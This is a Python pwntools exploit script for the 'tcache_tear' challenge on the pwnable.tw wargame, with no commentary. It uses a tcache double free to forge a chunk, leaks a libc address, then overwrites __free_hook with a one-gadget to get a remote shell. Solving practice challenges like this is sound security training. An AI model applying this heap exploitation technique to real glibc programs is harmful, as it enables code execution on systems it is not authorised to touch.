from pwn import *

local = False
elf = 'tcache_tear' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10207
    r = remote(ip,port)

context.arch = 'amd64'
l = ELF('./libc.so')

def add(size,content):
    r.recvuntil(':')
    r.sendline("1")
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(content)

def delete():
    r.recvuntil(':')
    r.sendline("2")

def show():
    r.recvuntil(':')
    r.sendline("3")
    r.recvuntil("Name :")
    l.address = u64(r.recv(6)+'\0\0') - 0x7f5ac6ed3ca0 + 0x00007f5ac6ae8000


raw_input("aaa")
r.recv()
name = 'QQ'
name_addr = 0x602060
start_main = 0x601ff0

r.send(name)

add ( 10 , 'aaa' )
delete()
delete()
add( 10 , p64(name_addr - 0x10)) # header
add( 10 , 'aaaa')
add( 10 , p64( 0 )+ p64(0x101) + p64(0xdeadbeef) + p64(0) * 29 + p64(0x101) + p64(0x21) +  p64(0) * 2 + p64(0x21) + p64(0x21)   )

add ( 0xf0 , 'aaa' )
delete()
delete()

add( 0xf0 , p64(name_addr)) # header
add( 0xf0 , 'aaaa')
add( 0xf0 , p64( 0xdeadbeef ) )
show()
delete()

show()
success("libc : %s", hex(l.address))
onegadget = l.address + 0x4f322
success("onegadget : %s", hex(onegadget))
add( 0x68 , 'aaa' )
delete()
delete()
add( 0x68 , p64( l.sym.__free_hook ) )
add( 0x68 , 'aaaa')
add( 0x68 , p64( onegadget ) )
delete()
r.interactive()
